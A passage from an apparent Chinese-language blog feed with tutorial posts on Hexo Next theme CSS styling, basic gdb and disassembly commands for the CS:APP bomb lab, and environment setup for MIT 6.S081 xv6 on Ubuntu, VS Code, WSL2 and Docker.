<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">之后在Next主题配置文件中中找到：`custom_file_path` 取消`style`的注释，意味着启用这个文件。</span><br><span class="line"></span><br><span class="line">打开复制粘贴如下内容：</span><br><span class="line"></span><br><span class="line">```css</span><br><span class="line">body &#123;</span><br><span class="line">    background:url(/images/background.png);</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">    background-attachment: fixed; //是否滚动，fixed固定</span><br><span class="line">    background-size: cover;      //填充</span><br><span class="line">    background-position: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ol>
<ul>
<li>background: url：你的背景图片的地址，放置于<code>Next</code>主题文件下的<code>source/images/background.png</code></li>
<li>fixed：表示是否随鼠标滚动，选择fixed固定</li>
<li>size：表示填充</li>
<li>posi：表示位置</li>
</ul>
<h3 id="设置背景透明"><a href="#设置背景透明" class="headerlink" title="设置背景透明"></a>设置背景透明</h3><p>还是在这个<code>styles.style</code>文件里面，接着上面的内容下面直接复制粘贴：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">//文章背板的颜色rgb</span><br><span class="line"><span class="selector-class">.main-inner</span> &gt; <span class="selector-class">.sub-menu</span>, <span class="selector-class">.main-inner</span> &gt; <span class="selector-class">.post-block</span>, <span class="selector-class">.main-inner</span> &gt; <span class="selector-class">.tabs-comment</span>, <span class="selector-class">.main-inner</span> &gt; <span class="selector-class">.comments</span>, <span class="selector-class">.main-inner</span> &gt; <span class="selector-class">.pagination</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#f5f5f56b</span>;      //此处使用十六进制颜色代码，         也可以使用rgba进行调色，</span><br><span class="line">                                //实际效果为白色透明色底板              rgba的第四参数即为透明度</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span>&#123;               //修改主体字体颜色</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#000</span>;      //纯黑</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.posts-expand</span> <span class="selector-class">.post-title-link</span> &#123;    //标题颜色</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#000</span>;                //首页文章标题颜色， （默认为灰辨识度不高）</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.posts-expand</span> <span class="selector-class">.post-meta-container</span> &#123;    //标题下的日期颜色</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#880000</span>;             //此处修改为红色，可自行调用rgb调色</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//侧边框的透明度设置</span><br><span class="line"><span class="selector-class">.sidebar</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.7</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//菜单栏的调色</span><br><span class="line"><span class="selector-class">.header-inner</span> &#123;     </span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.7</span>);</span><br><span class="line">&#125;</span><br><span class="line">//搜索框透明</span><br><span class="line"><span class="selector-class">.popup</span> &#123;        </span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.main-inner</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>);  //主体背景透明</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0px</span> <span class="number">40px</span> <span class="number">40px</span> <span class="number">40px</span>;  //调整组件位置</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中所有的内容都有注释，可以<strong>自己调节</strong></p>
<p>注意：0为完全透明，1为完全不透明</p>
<hr>
<h3 id="边框圆角设置"><a href="#边框圆角设置" class="headerlink" title="边框圆角设置"></a>边框圆角设置</h3><p>在 <code>style.style</code>同级文件夹下新建：<code>variables.styl</code>，并且在主题配置文件中同样取消<code>custom_file_path</code>的<code>variable</code>的注释，代表启用variable</p>
<p>然后打开这个文件，输入以下内容：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">// 圆角设置</span><br><span class="line">$<span class="attribute">border-radius</span>-inner     = <span class="number">30px</span> <span class="number">30px</span> <span class="number">30px</span> <span class="number">30px</span>;</span><br><span class="line">$<span class="attribute">border-radius</span>           = <span class="number">30px</span>;</span><br></pre></td></tr></table></figure>

<p>其中 数值表示圆角的弧度，可以自己设置</p>
]]></content>
      <categories>
        <category>EATPOOP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>gdb使用指北</title>
    <url>/EATPOOP/gdb_use/2024/01/17/</url>
    <content><![CDATA[<blockquote>
<p>这里陈述的用法主要是为了反汇编和bomblab所服务(至少在目前是)</p>
</blockquote>
<h2 id="gdb用法指北"><a href="#gdb用法指北" class="headerlink" title="gdb用法指北"></a>gdb用法指北</h2><p>GDB（GNU Debugger）是一个强大的调试工具，用于分析和调试程序。以下是一些GDB的基础命令：</p>
<p><strong>启动程序：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb &lt;executable&gt;</span><br></pre></td></tr></table></figure>

<p>启动GDB并加载要调试的可执行文件。</p>
<p><strong>设置断点：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break &lt;function_name&gt;</span><br></pre></td></tr></table></figure>

<p>在指定的函数内设置断点，使程序在该函数内停止执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break &lt;line_number&gt;</span><br></pre></td></tr></table></figure>

<p>在指定行号上设置断点。</p>
<p><strong>运行程序：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>

<p>运行程序，直到遇到断点或程序结束。</p>
<p><strong>单步执行：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stepi  </span><br></pre></td></tr></table></figure>

<p>单步执行程序，进入函数内部。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">next</span><br></pre></td></tr></table></figure>

<p>单步执行程序，不进入函数内部，直到函数调用结束。</p>
<p><strong>完成当前函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">finish</span><br></pre></td></tr></table></figure>

<p><strong>查看变量的值：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print &lt;variable&gt;</span><br></pre></td></tr></table></figure>

<p>打印指定变量的值。</p>
<p><strong>查看堆栈帧：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">backtrace</span><br></pre></td></tr></table></figure>

<p>打印当前调用堆栈的信息。</p>
<p><strong>切换到指定帧：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frame &lt;frame_number&gt;</span><br></pre></td></tr></table></figure>

<p>切换到指定的堆栈帧。</p>
<p><strong>继续执行程序：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">continue</span><br></pre></td></tr></table></figure>

<p>从当前位置继续执行程序，直到遇到下一个断点或程序结束。</p>
<p><strong>查看符号表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -t bomb | less</span><br></pre></td></tr></table></figure>

<p><strong>反编译炸弹</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -d bomb &gt; bomb.txt</span><br></pre></td></tr></table></figure>

<p><strong>退出GDB：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>退出GDB。</p>
<h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><ol>
<li><p><strong>反汇编函数：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disassemble &lt;function_name&gt;</span><br></pre></td></tr></table></figure>

<p>显示指定函数的汇编代码。</p>
</li>
<li><p><strong>反汇编当前代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disassemble</span><br></pre></td></tr></table></figure>

<p>可以缩写为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disas</span><br></pre></td></tr></table></figure>

<p>显示当前执行点附近的汇编代码。</p>
</li>
<li><p><strong>设置反汇编指令数目：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set disassembly-flavor &lt;flavor&gt;</span><br></pre></td></tr></table></figure>

<p>设置反汇编输出的指令数目。<code>&lt;flavor&gt;</code> 可以是 <code>att</code> 或 <code>intel</code>，表示使用AT&amp;T或Intel语法。</p>
</li>
<li><p><strong>查看寄存器值：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info registers</span><br></pre></td></tr></table></figure>

<p>显示当前寄存器的值。</p>
</li>
<li><p><strong>在反汇编中设置断点：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break *&lt;address&gt;</span><br></pre></td></tr></table></figure>

<p>在指定地址处设置断点，可以是汇编指令的地址。</p>
</li>
<li><p><strong>查看内存内容：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x/&lt;n&gt;x &lt;address&gt;</span><br></pre></td></tr></table></figure>

<p>显示从指定地址开始的 <code>n</code> 个十六进制字节。例如，<code>x/4x $rsp</code> 显示栈顶部的四个字节。</p>
</li>
<li><p><strong>查看指令执行前后的内存变化：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">display/i $pc</span><br></pre></td></tr></table></figure>

<p>每次程序停下来时，显示当前指令的反汇编，并在每步执行后继续显示。</p>
</li>
<li><p><strong>进入&#x2F;离开汇编级别：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">layout asm</span><br></pre></td></tr></table></figure>

<p>进入汇编级别的布局，显示源代码和汇编代码。可以使用 <code>Ctrl+X</code>，然后按 <code>2</code> 来切换到汇编级别。</p>
</li>
<li><p><strong>设置汇编级别布局显示选项：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set asm-options</span><br></pre></td></tr></table></figure>

<p>设置汇编级别布局的显示选项，例如，<code>set asm-options intel</code> 切换到Intel语法。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>EATPOOP</category>
      </categories>
      <tags>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu配置xv6的可行性措施</title>
    <url>/EATPOOP/xv6_environment/2023/12/06/</url>
    <content><![CDATA[<h1 id="Author-师傅-Editor-Vite"><a href="#Author-师傅-Editor-Vite" class="headerlink" title="Author:师傅+Editor:Vite"></a>Author:师傅+Editor:Vite</h1><h3 id="经过无数次尝试和重装，耗时近40个小时，终于探索出一条用vscode调试xv6的可行性道路"><a href="#经过无数次尝试和重装，耗时近40个小时，终于探索出一条用vscode调试xv6的可行性道路" class="headerlink" title="经过无数次尝试和重装，耗时近40个小时，终于探索出一条用vscode调试xv6的可行性道路"></a>经过无数次尝试和重装，耗时近40个小时，终于探索出一条用vscode调试xv6的可行性道路</h3><h1 id="1-重装虚拟机"><a href="#1-重装虚拟机" class="headerlink" title="1.重装虚拟机"></a>1.重装虚拟机</h1><p>按照上一个说明的流程，安装一个新的虚拟机并记住它的名字。记住账户名<strong>在下文统一用username指代账户名</strong></p>
<h2 id="一、更换-etc-apt-sources-list-文件里的源"><a href="#一、更换-etc-apt-sources-list-文件里的源" class="headerlink" title="一、更换**&#x2F;etc&#x2F;apt&#x2F;sources.list**文件里的源"></a>一、更换**&#x2F;etc&#x2F;apt&#x2F;sources.list**文件里的源</h2><h3 id="1-备份源列表"><a href="#1-备份源列表" class="headerlink" title="1. 备份源列表"></a>1. 备份源列表</h3><p>Ubuntu配置的默认源并不是国内的服务器，下载更新软件都比较慢。首先备份源列表文件<strong>sources.list</strong>：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># 首先备份源列表</span><br><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup</span><br></pre></td></tr></table></figure>

<h3 id="2-打开sources-list文件修改"><a href="#2-打开sources-list文件修改" class="headerlink" title="2. 打开sources.list文件修改"></a>2. 打开sources.list文件修改</h3><p>选择合适的源，替换原文件的内容，保存编辑好的文件, 以阿里云更新服务器为例（可以分别测试阿里云、清华、中科大、163源的速度，选择最快的）：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># 打开sources.list文件</span><br><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>编辑**&#x2F;etc&#x2F;apt&#x2F;sources.list**文件, 在文件最前面添加阿里云镜像源：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">#  阿里源</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>

<h3 id="3-刷新列表"><a href="#3-刷新列表" class="headerlink" title="3. 刷新列表"></a>3. 刷新列表</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get install build-essential</span><br></pre></td></tr></table></figure>

<p>下载速度瞬间就起飞了。</p>
<h1 id="2-配置riscv-qemu-clone的快速方法"><a href="#2-配置riscv-qemu-clone的快速方法" class="headerlink" title="2.配置riscv+qemu+clone的快速方法"></a>2.配置riscv+qemu+clone的快速方法</h1><pre><code>//下载必要组件并解压
$sudo apt install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu libglib2.0-dev libpixman-1-dev gcc-riscv64-unknown-elf
$wget https://download.qemu.org/qemu-5.1.0.tar.xz
$tar xvf qemu-5.1.0.tar.xz
$cd qemu-5.1.0
</code></pre>
<p>接下来运行这条命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$./configure --disable-kvm --disable-werror --prefix=/usr/local --target-list=&quot;riscv64-softmmu&quot;</span><br></pre></td></tr></table></figure>

<p>如果报这个错误:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ERROR: glib-2.48 gthread-2.0 is required to compile QEMU</span><br></pre></td></tr></table></figure>

<p>解决方法为<code>sudo apt install libglib2.0-dev</code></p>
<p>还可能报这个错误：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ERROR: pixman &gt;= 0.21.8 not present.</span><br><span class="line">       Please install the pixman devel package.</span><br></pre></td></tr></table></figure>

<p>解决方法为<code>sudo apt install libpixman-1-dev</code></p>
<p>之后编译,克隆源代码并初始运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$make</span><br><span class="line">$sudo make install</span><br><span class="line">$cd ~</span><br><span class="line">$git clone git://g.csail.mit.edu/xv6-labs-2020</span><br><span class="line">$cd xv6-labs-2020</span><br><span class="line">$git checkout util</span><br><span class="line">$make qemu</span><br></pre></td></tr></table></figure>

<h1 id="2-vscode远程调试"><a href="#2-vscode远程调试" class="headerlink" title="2. vscode远程调试"></a>2. vscode远程调试</h1><h4 id="在vscode上安装remote-ssh一系列扩展"><a href="#在vscode上安装remote-ssh一系列扩展" class="headerlink" title="在vscode上安装remote ssh一系列扩展."></a>在vscode上安装remote ssh一系列扩展.</h4><h4 id="在虚拟机终端输入ifconfig-如果报错就按它的指示去做-并获得地址名得到inet值"><a href="#在虚拟机终端输入ifconfig-如果报错就按它的指示去做-并获得地址名得到inet值" class="headerlink" title="在虚拟机终端输入ifconfig(如果报错就按它的指示去做)并获得地址名得到inet值"></a>在虚拟机终端输入ifconfig(如果报错就按它的指示去做)并获得地址名得到<strong>inet值</strong></h4><h4 id="在vscode中的ssh配置文件中加入以下东西：（或者修改）"><a href="#在vscode中的ssh配置文件中加入以下东西：（或者修改）" class="headerlink" title="在vscode中的ssh配置文件中加入以下东西：（或者修改）"></a>在vscode中的ssh配置文件中加入以下东西：（或者修改）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host 造一个名字(随便取)</span><br><span class="line">    HostName 输入你得到的地址</span><br><span class="line">    User 用户名字(ubuntu的账户名字即为username)</span><br></pre></td></tr></table></figure>

<h4 id="在你的windows终端中跑一遍ssh检验是否能够连接虚拟机"><a href="#在你的windows终端中跑一遍ssh检验是否能够连接虚拟机" class="headerlink" title="在你的windows终端中跑一遍ssh检验是否能够连接虚拟机"></a>在你的windows终端中跑一遍ssh检验是否能够连接虚拟机</h4><p>打开cmd,输入以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh username@&lt;inet的地址&gt;</span><br></pre></td></tr></table></figure>

<p>若报以下错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh: connect to host XX.XX.XX.XX port 22: Connection refused</span><br></pre></td></tr></table></figure>

<p>需要开启ssh服务,重启ssh服务(这个报错还挺平凡的,重启下ssh服务一般就能解决)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/ssh start</span><br><span class="line">sudo /etc/init.d/ssh stop</span><br><span class="line">sudo /etc/init.d/ssh start</span><br></pre></td></tr></table></figure>

<h4 id="在vscode中远程连接虚拟机并输入两次密码-在vscode里面远程连接至主机"><a href="#在vscode中远程连接虚拟机并输入两次密码-在vscode里面远程连接至主机" class="headerlink" title="在vscode中远程连接虚拟机并输入两次密码(在vscode里面远程连接至主机)"></a>在vscode中远程连接虚拟机并输入两次密码(在vscode里面远程连接至主机)</h4><p>用vscode打开xv6-labs-2020文件目录并在目录下创建一个.vscode文件夹</p>
<p>手动新建一个<strong>launch.json</strong>文件,并把以下内容修改username后粘贴</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;(gdb) 启动&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/genesis/xv6-labs-2020/kernel/kernel&quot;</span><span class="punctuation">,</span><span class="comment">//你的kernel所在的目录</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="comment">//可以后续传参</span></span><br><span class="line">        <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//支持断点调试</span></span><br><span class="line">        <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;miDebuggerServerAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;localhost:26000&quot;</span><span class="punctuation">,</span><span class="comment">//这是默认端口</span></span><br><span class="line">        <span class="attr">&quot;miDebuggerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/bin/gdb-multiarch&quot;</span><span class="punctuation">,</span><span class="comment">//x86环境支持组件</span></span><br><span class="line">        <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;setupCommands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;为 gdb 启用整齐打印&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-enable-pretty-printing&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;logging&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;engineLogging&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;programOutput&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span>   </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="修改gdbinit-teml-riscv-最后一句支持更广泛的断点调试-但目前断点调试好像不成功2023-12-8"><a href="#修改gdbinit-teml-riscv-最后一句支持更广泛的断点调试-但目前断点调试好像不成功2023-12-8" class="headerlink" title="修改gdbinit.teml.riscv:(最后一句支持更广泛的断点调试)(**但目前断点调试好像不成功2023.12.8)"></a>修改gdbinit.teml.riscv:(最后一句支持更广泛的断点调试)(**但目前断点调试好像不成功2023.12.8)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set confirm off</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">target remote 127.0.0.1:1234</span><br><span class="line">symbol-file kernel/kernel</span><br><span class="line">set disassemble-next-line auto</span><br><span class="line">set riscv use-compressed-breakpoints yes</span><br></pre></td></tr></table></figure>

<h4 id="在vscode终端启动qemu"><a href="#在vscode终端启动qemu" class="headerlink" title="在vscode终端启动qemu:"></a>在vscode终端启动qemu:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$make qemu-gdb</span><br></pre></td></tr></table></figure>

<h4 id="注释gdbinit文件-每次启动qemu都要修改，可以尝试优化-："><a href="#注释gdbinit文件-每次启动qemu都要修改，可以尝试优化-：" class="headerlink" title="注释gdbinit文件(每次启动qemu都要修改，可以尝试优化)："></a>注释gdbinit文件(每次启动qemu都要修改，可以尝试优化)：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set confirm off</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">#target remote 127.0.0.1:26000</span><br><span class="line">symbol-file kernel/kernel</span><br><span class="line">set disassemble-next-line auto</span><br><span class="line">set riscv use-compressed-breakpoints yes</span><br></pre></td></tr></table></figure>

<h3 id="按下两次f5并祈祷"><a href="#按下两次f5并祈祷" class="headerlink" title="按下两次f5并祈祷"></a>按下两次f5并祈祷</h3><h3 id="参考教程："><a href="#参考教程：" class="headerlink" title="参考教程："></a>参考教程：</h3><ol>
<li><p><a href="https://www.bilibili.com/video/BV11K4y127Qk/?spm_id_from=333.337.search-card.all.click&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">MIT 6S081 环境搭建指南 保姆级教学</a></p>
</li>
<li><p><a href="https://www.bilibili.com/video/BV1Lv411g7EV/?spm_id_from=333.788&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">mit6s081 通过vscode来debug kernel</a></p>
</li>
</ol>
<h1 id="3-打分"><a href="#3-打分" class="headerlink" title="3.打分"></a>3.打分</h1><p>如果make grade失败并报错‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;python&#x27;: No such file or directory，</span><br></pre></td></tr></table></figure>

<p>可以进行如下操作</p>
<pre><code>//查看已安装的python版本
python3 --version

//查找python3的位置
whereis python3

//为其创建连接符号(注意观察路径,自己调整)
sudo ln -s /usr/bin/python3 /usr/bin/python
</code></pre>
<h2 id="参考学习资料"><a href="#参考学习资料" class="headerlink" title="参考学习资料"></a>参考学习资料</h2><ol>
<li><a href="https://tarplkpqsm.feishu.cn/docs/doccnBFsXFMsAr1oXEVsaT9E3Jg">一起来学MIT6.S081呀～ - 飞书云文档 (feishu.cn)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/624091268">MIT 6.S081 Operating System  - 知乎 (zhihu.com)</a></li>
<li><a href="https://pdos.csail.mit.edu/6.S081/2020/tools.html">6.S081 &#x2F; Fall 2020 (mit.edu)</a></li>
</ol>
]]></content>
      <categories>
        <category>EATPOOP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>配置xv6和csapp</title>
    <url>/EATPOOP/docker_use/2024/01/14/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直在折腾Mit6.s081的课程实验环境配置和csapp，在网上搜集了大量资料，整理出了以下教程，不得不说Docker真的是个超级无敌伟大的发明</p>
<blockquote>
<p>M系列芯片的macbook还是别考虑做实验了,反正我没折腾好</p>
</blockquote>
<h1 id="在WIN10下的WSL2踩坑和安装"><a href="#在WIN10下的WSL2踩坑和安装" class="headerlink" title="在WIN10下的WSL2踩坑和安装"></a>在WIN10下的WSL2踩坑和安装</h1><blockquote>
<p><a href="https://juejin.cn/post/7099108145825316894#heading-0">参考文章</a></p>
</blockquote>
<p>如果使用的是家庭版win10，先win+R输入winver看看操作系统版本号是不是</p>
<ul>
<li>Windows 10 64-bit: 家庭版 or 专业版 21H1 (build 19043)及以上, or 企业版 or 教育版 20H2 (build 19042)及以上. 不是的话本篇文章无效</li>
</ul>
<h2 id="1-安装Hyper-V"><a href="#1-安装Hyper-V" class="headerlink" title="1.安装Hyper-V"></a>1.安装Hyper-V</h2><p>这个是Windows10内置的，不用去特地下载安装，这是 Docker Desktop for Windows 所使用的虚拟机。 但是这个虚拟机一旦启用，QEMU、VirtualBox 或 VMWare Workstation 15 及以下版本将无法使用！（所以更新到VMWare Workstation 16就万事大吉了）</p>
<p>首先右键开始菜单，选择应用与功能<br> <img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315138.awebp" alt="1513668234-4363-20171206211136409-1609350099.png"></p>
<p>然后点击程序与功能<br> <img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315168.awebp" alt="1513668234-4368-20171206211345066-1430601107.png"></p>
<p>选择启用或关闭Windows功能<br> <img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315176.awebp" alt="1513668234-9748-20171206211435534-1499766232.png"></p>
<p>这是第一种情况<br> <img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315190.awebp" alt="1513668234-6433-20171206211858191-1177002365.png"></p>
<p>如果你的界面是这样的，且没有下列选项中的Hyper-V，则先选中打钩的下面三个，然后确定，再参考<a href="https://link.juejin.cn/?target=https://blog.csdn.net/lanxingxing666666/article/details/111354089">win10没有Hyper-v的解决方法</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315198.awebp" alt="Snipaste_2022-05-18_00-26-50.png"></p>
<h2 id="2-将WSL版本升级为WSL2"><a href="#2-将WSL版本升级为WSL2" class="headerlink" title="2.将WSL版本升级为WSL2"></a>2.将WSL版本升级为WSL2</h2><p>首先看看版本号是否为2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复制代码wsl -l -v</span><br></pre></td></tr></table></figure>

<p>若已有发行版且版本为1，使用命令 </p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">arduino</span><br><span class="line">复制代码wsl --set-<span class="keyword">default</span>-version <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>发现版本还没改过来</p>
<p>管理员权限打开终端，输入命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">复制代码dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure>

